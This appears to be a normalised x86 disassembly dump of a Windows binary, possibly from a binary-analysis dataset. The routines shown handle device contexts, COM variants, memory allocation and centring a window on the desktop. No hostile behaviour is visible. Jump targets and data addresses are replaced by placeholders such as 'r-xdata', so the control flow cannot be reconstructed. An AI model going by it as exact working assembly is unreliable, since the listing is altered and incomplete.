push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push [ eax - 0xa0 ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ GetDC@IAT ]
mov edi eax
push 0x3
push edi
call [ SetMapMode@IAT ]
mov bl [ ebp + 0x14 ]
mov [ ebp - 0x14 ] esi
test bl 0x4
mov [ ebp - 0x10 ] esi
je r-xdata
test bl 0x8
je r-xdata
mov eax [ ebp + 0xc ]
push 0x2
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov [ ebp - 0xc ] ecx
call [ LPtoDP@IAT ]
test bl 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x80070057
mov esi [ ebp + 0x10 ]
fld [ esi ]
call sub_40e254
fld [ esi + 0x4 ]
mov [ ebp - 0xc ] eax
call sub_40e254
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push 0x2
push eax
push edi
call [ DPtoLP@IAT ]
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
fild [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
fstp [ eax ]
fild [ ebp + 0x10 ]
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x8 ]
jmp r-xdata
fild [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
fstp [ eax ]
fild [ ebp - 0x8 ]
fstp [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ eax - 0xa0 ]
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
sub_407c22
mov eax [ esp + 0x4 ]
push [ esp + 0x1c ]
add eax 0xffffff3c
push [ esp + 0xc ]
mov ecx [ eax + 0x1c ]
push eax
mov ecx [ ecx + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x94 ]
neg eax
sbb eax eax
and eax 0x7ffdfffd
add eax 0x80020003
retn 0x24
sub_407c53
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_407c9d
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xc8 ]
xor esi esi
cmp [ edi + 0xa0 ] esi
jne r-xdata
xor eax eax
cmp [ edi + 0x88 ] esi
mov ebx [ ebp + 0xc ]
jne r-xdata
cmp [ edi + 0x94 ] ebx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx edi
push eax
mov [ ebp - 0x38 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
call sub_406f2e
mov eax [ ebp - 0x20 ]
cmp eax esi
jne r-xdata
lea eax [ edi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
mov eax [ edi + 0x4c ]
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x20
lea eax [ ebp - 0x34 ]
push esi
push eax
call sub_40cc70
push 0x10
lea eax [ ebp - 0x14 ]
push esi
push eax
call sub_40cc70
add esp 0x18
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ edi + 0xa8 ]
mov edx [ eax ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x2
push esi
push r--data
push ebx
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x30 ] esi
mov ebx [ SysFreeString@IAT ]
mov [ ebp + 0xc ] eax
je r-xdata
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x30 ]
call ebx
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0xc ] esi
jl r-xdata
push [ ebp - 0x28 ]
call ebx
mov [ edi + 0xa4 ] 0x1
sub_407db3
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp [ eax - 0x28 ] esi
lea ecx [ eax - 0xc8 ]
jne r-xdata
xor eax eax
cmp [ ecx + 0x88 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_406f2e
mov eax [ ebp - 0xc ]
cmp eax esi
jne r-xdata
pop esi
leave
retn 0x8
sub_407e0e
push ebp
mov ebp esp
push esi
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_40ccd0
mov esi [ ebp + 0x8 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov [ eax ] esi
mov eax [ esi ]
call [ eax + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi - 0x90 ]
push 0x10
push eax
push [ ebp + 0xc ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_407e7a
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
xor esi esi
lea ecx [ eax - 0xcc ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_406f2e
cmp [ ebp + 0x20 ] esi
pop esi
je r-xdata
mov eax [ ebp - 0xc ]
leave
retn 0x24
push [ ebp + 0x20 ]
call [ VariantClear@IAT ]
sub_407ecf
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
xor edi edi
push 0xa
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
call sub_41a71b
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
retn 0x4
sub_407f1d
mov eax sub_426383
call sub_40cc20
sub esp 0x14
push ebx
push esi
mov esi ecx
mov [ ebp - 0x20 ] esi
mov [ esi ] r--data
xor ebx ebx
cmp [ esi + 0x58 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push edi
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x1c ] ecx
call sub_41a75a
cmp [ esi + 0x40 ] ebx
je r-xdata
mov eax [ esi + 0x1c ]
push ebx
mov edi [ eax + 0x8 ]
mov ecx [ edi ]
push [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xb8 ]
mov eax [ edi ]
mov [ eax + 0x90 ] ebx
jmp r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
cmp [ esi + 0x24 ] ebx
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
je r-xdata
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ esi + 0x58 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ esi + 0x14 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ esi + 0x3c ]
call sub_41b82f
push [ esi + 0x40 ]
call sub_41b82f
pop ecx
pop ecx
xor ebx ebx
cmp [ esi + 0x38 ] ebx
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
jle r-xdata
mov ecx [ esi + 0x54 ]
cmp ecx ebx
je r-xdata
push eax
call [ CoTaskMemFree@IAT ]
push [ esi + 0x14 ]
call [ CoTaskMemFree@IAT ]
xor edi edi
mov edi [ esi + 0x54 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x50 ]
push [ eax ]
call sub_4080fd
mov ecx [ esi + 0x54 ]
call sub_40821e
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
call sub_41a75a
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
cmp ecx ebx
je r-xdata
mov ecx eax
mov eax [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x90 ] ebx
jmp r-xdata
mov edi [ esi + 0x50 ]
cmp edi ebx
je r-xdata
mov ecx edi
call sub_40821e
push edi
call sub_41b82f
pop ecx
inc [ ebp - 0x14 ]
add edi 0x28
mov eax [ ebp - 0x14 ]
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4c ]
pop edi
cmp eax ebx
je r-xdata
mov ecx edi
call sub_408184
push edi
call sub_41b82f
pop ecx
mov eax [ esi + 0x14 ]
mov eax [ eax + edi + 0x24 ]
mov eax [ eax + 0x4 ]
mov esi [ esi + 0x48 ]
cmp esi ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
call sub_41a77a
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_4080fd
mov eax sub_426398
call sub_40cc20
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push edi
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] ebx
call [ ecx ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
jl r-xdata
push [ esi ]
mov [ esi + 0x4 ] ebx
call sub_41b82f
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
pop ecx
cmp eax ebx
mov [ esi ] ebx
pop edi
je r-xdata
xor edi edi
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edx [ esi ]
mov eax [ ebp - 0x10 ]
push ebx
push [ edx + edi * 8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
inc edi
cmp edi [ esi + 0x4 ]
jb r-xdata
sub_408184
mov eax sub_4263b7
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_4081cf
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi ]
or [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_4081cf
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
call sub_4081fe
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4081fe
push esi
push edi
lea esi [ ecx + 0xc ]
xor edi edi
xor eax eax
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
retn
mov eax [ ecx ]
push edi
push edi
push edi
mov ecx [ eax ]
push esi
push 0x1
push eax
call [ ecx + 0x18 ]
mov [ esi ] edi
sub_40821e
push esi
mov esi ecx
push edi
mov edi [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x10 ] 0x0
push [ esi + 0x8 ]
call sub_41b82f
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop ecx
pop edi
pop esi
retn
push eax
call edi
and [ esi + 0x14 ] 0x0
sub_408258
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x24 ]
call sub_41e07f
mov edi eax
mov [ ebp - 0x8 ] edi
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
neg eax
sbb eax eax
push 0x0
inc eax
pop ebx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
lea edi [ esi + 0x48 ]
push edi
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
call [ GetDesktopWindow@IAT ]
push eax
call sub_41cbcb
lea ecx [ ebp - 0x34 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x28 ]
push ebx
sub eax [ ebp - 0x30 ]
push ebx
push ebx
mov ecx edi
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
cdq
sub eax edx
sar eax 0x1
push eax
call sub_41f242
push 0x1
mov ecx edi
call sub_41f2d2
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
cmp eax ebx
jl r-xdata
mov eax [ edi ]
lea edi [ esi + 0x4c ]
push edi
push r--data
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
cmp [ edi ] ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov [ ebp - 0x4 ] 0x80004003
mov ecx [ eax ]
lea edi [ esi + 0x8 ]
push edi
push r--data
push eax
call [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx esi
call sub_408463
cmp [ ebp - 0x14 ] ebx
mov esi eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov edi [ edi ]
lea ecx [ esi + 0xc ]
push ecx
push r--data
mov eax [ edi ]
push edi
call [ eax ]
mov eax esi
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_41f242
mov ecx [ ebp - 0x8 ]
push ebx
call sub_41f2d2
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_41f242
mov ecx [ ebp - 0x8 ]
push ebx
call sub_41f2d2
sub_4083fa
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ecx + 0x48 ]
test edx edx
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x50 ]
neg eax
sbb eax eax
and eax edx
leave
retn
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
xor eax eax
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_408463
mov eax sub_4263d7
call sub_40cc20
sub esp 0x98
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x14 ]
cmp [ esi + 0x48 ] edi
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x2c ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jl r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
lea eax [ ebp - 0xa4 ]
push r--data
push eax
mov ecx esi
call sub_408c92
or [ ebp - 0x84 ] 0xffffffff
lea eax [ ebp - 0x74 ]
push r--data
push eax
mov ecx esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x80 ] 0x18
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x78 ] 0x1fb
call sub_408c92
mov eax [ ebp - 0x1c ]
or [ ebp - 0x54 ] 0xffffffff
push edi
lea edx [ ebp - 0xa4 ]
push 0x28
mov [ ebp - 0x5c ] 0x1c
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x50 ] 0x20
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x48 ] 0x1e
mov ecx [ eax ]
push edx
push 0x2
push eax
call [ ecx + 0x10 ]
mov ebx eax
cmp ebx edi
jge r-xdata
push 0x10
call sub_41b806
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x24 ]
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x1c ]
xor ecx ecx
push ebx
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] edi
mov edx [ eax ]
push ecx
push ecx
push eax
call [ edx + 0x18 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jge r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
jmp r-xdata
xor eax eax
push [ ebp - 0x14 ]
mov ecx eax
call sub_408783
jmp r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
lea edx [ esi + 0x58 ]
push edx
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
add edx 0xd8
push edx
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x38 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x34 ] ecx
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x50 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esi + 0x50 ]
call sub_4088a7
push 0x1c
call sub_41b806
cmp eax edi
pop ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx edi
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x20 ]
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x14 ] edi
jle r-xdata
mov ecx [ esi + 0x50 ]
mov [ esi + 0x54 ] eax
push [ ecx ]
mov ecx eax
call sub_4088bc
mov ecx [ esi + 0x50 ]
mov eax [ esi + 0x54 ]
mov [ ecx + 0x8 ] eax
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
mov [ esi + 0x10 ] eax
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x14 ] eax
lea ecx [ ecx + ecx * 4 ]
shl ecx 0x3
push ecx
push edi
push eax
call sub_40cc70
mov ecx [ esi + 0x50 ]
add esp 0xc
call sub_4087d4
mov ecx [ esi + 0x50 ]
call sub_4081fe
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax edi
jle r-xdata
xor eax eax
push 0xa
mov ecx eax
call sub_41a71b
jmp r-xdata
push [ ebp - 0x28 ]
call [ CoTaskMemFree@IAT ]
add ecx 0x24
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
push 0x1c
call sub_41b806
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ esi + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
inc [ ebp - 0x14 ]
mov [ ebx + ecx + 0x24 ] eax
mov eax [ ebp - 0x14 ]
add ebx 0x28
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call sub_41a75a
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
cmp ecx edi
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ebx [ ebx ]
push 0x1
push [ eax + 0x8 ]
mov ecx esi
call [ edx + 0x8 ]
jmp r-xdata
add [ ebp - 0x10 ] 0x28
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ebx [ eax + 0x4 ]
sub_408783
mov eax sub_4263f7
call sub_40cc20
sub esp 0x14
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ esi ] edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x4 ] edi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
push esi
call sub_40ac36
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
call sub_408184
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4087d4
push esi
mov esi ecx
call sub_4081fe
mov eax [ esi ]
push 0x0
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
test eax eax
jl r-xdata
pop esi
retn
push 0x1
push 0x0
mov ecx esi
call sub_4087f7
sub_4087f7
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
mov esi ecx
call sub_4081fe
lea edx [ ebp - 0x4 ]
lea eax [ esi + 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
mov dl [ ebp + 0xc ]
neg dl
sbb edx edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
and edx 0x2
dec edx
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push 0x0
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
pop esi
leave
retn 0x8
push edi
mov ecx esi
call sub_408850
mov edi eax
test edi edi
jge r-xdata
mov eax edi
pop edi
mov ecx esi
call sub_4081fe
sub_408850
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor edi edi
mov ecx [ esi + 0x8 ]
mov ebx [ ecx + 0x4 ]
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
mov ecx [ ecx ]
cmp [ ecx + edi * 8 + 0x4 ] 0x0
je r-xdata
inc edi
cmp edi ebx
jb r-xdata
push edi
mov ecx esi
call sub_408884
test eax eax
jl r-xdata
sub_408884
mov eax [ ecx + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push edx
mov esi [ eax + esi * 8 ]
mov eax [ ecx ]
push esi
push [ ecx + 0xc ]
mov edi [ eax ]
push eax
call [ edi + 0x10 ]
pop edi
pop esi
retn 0x4
sub_4088bc
mov eax sub_426414
call sub_40cc20
sub esp 0x20
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] edi
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
push ecx
push rw-data
mov eax [ esi ]
push esi
mov [ ebp - 0x4 ] edi
call [ eax ]
cmp eax edi
mov [ ebp + 0x8 ] eax
jge r-xdata
cmp [ ebx + 0x10 ] 0x0
mov [ ebp + 0x8 ] edi
lea edi [ ebx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax edi
je r-xdata
mov [ ebx + 0x18 ] 0x1
and [ ebp - 0x1c ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x1c ]
push ecx
push rw-data
push esi
mov [ ebp - 0x4 ] 0x1
call [ eax ]
mov esi eax
test esi esi
jge r-xdata
